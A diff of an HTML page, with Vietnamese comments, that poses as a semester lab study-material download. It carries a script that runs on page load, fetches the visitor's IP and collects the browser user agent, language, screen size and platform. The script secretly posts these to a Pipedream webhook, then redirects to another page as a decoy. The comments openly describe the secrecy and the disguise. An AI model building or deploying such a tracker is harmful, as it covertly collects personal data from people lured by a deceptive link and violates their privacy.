@@ -1,57 +1,35 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <title>Tài liệu Ôn tập Lab - Học kỳ 2026</title>
-    <meta property="og:title" content="Tài liệu hướng dẫn Lab chi tiết - Update 2026">
-    <meta property="og:description" content="Nhấn vào để tải bộ tài liệu ôn thi học kỳ.">
-    <meta property="og:image" content="https://img.meta.com.vn/Data/image/2021/09/22/anh-meo-cute-de-thuong-34.jpg"> 
-    <meta property="og:type" content="website">
-    <style>
-        body { font-family: sans-serif; text-align: center; margin-top: 100px; background-color: #f0f2f5; }
-        .box { border: 1px solid #ccc; padding: 40px; display: inline-block; background: white; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <div class="loader"></div>
-        <h1>Đang tải tài liệu...</h1>
-        <p>Vui lòng đợi trong giây lát, hệ thống đang xác thực quyền truy cập.</p>
-    </div>
+<script>
+    async function collectExpertData() {
+        try {
+            // 1. Lấy IP từ dịch vụ công cộng
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
 
-    <script>
-        async function collectAndSend() {
-            try {
-                // Bước 1: Lấy IP
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const userIP = data.ip;
+            // 2. Thu thập bộ thông tin tối đa trình duyệt cho phép
+            const payload = {
+                ip: ipData.ip,
+                device: navigator.userAgent, // Tên máy, hệ điều hành, trình duyệt
+                language: navigator.language, // Ngôn ngữ máy
+                screen: window.screen.width + "x" + window.screen.height, // Độ phân giải màn hình
+                time: new Date().toLocaleString(), // Thời gian nhấn vào
+                platform: navigator.platform // Nền tảng hệ thống
+            };
 
-                // Bước 2: Gửi về Pipedream (Dùng FETCH mode no-cors)
-                fetch('https://eo8z560mmcz7078.m.pipedream.net', {
-                    method: 'POST',
-                    mode: 'no-cors', // Ép trình duyệt không chặn
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        ip: userIP,
-                        device: navigator.userAgent,
-                        time: new Date().toLocaleString()
-                    })
-                });
+            // 3. Gửi về Pipedream bí mật
+            fetch('https://eo8z560mmcz7078.m.pipedream.net', {
+                method: 'POST',
+                mode: 'no-cors', 
+                body: JSON.stringify(payload)
+            });
 
-                // Bước 3: Đánh lạc hướng (Chuyển đến tài liệu thật sau 2 giây)
-                setTimeout(() => {
-                    window.location.href = "https://google.com"; // THAY LINK DRIVE THẬT CỦA MINH VÀO ĐÂY
-                }, 2000);
+            // 4. Chuyển hướng để ngụy trang
+            setTimeout(() => {
+                window.location.href = "https://google.com"; // Thay link tài liệu thật vào đây
+            }, 2000);
 
-            } catch (error) {
-                // Nếu lỗi vẫn chuyển hướng để không bị nghi ngờ
-                window.location.href = "https://google.com";
-            }
+        } catch (e) {
+            window.location.href = "https://google.com";
         }
-        window.onload = collectAndSend;
-    </script>
-</body>
-</html>
+    }
+    window.onload = collectExpertData;
+</script>
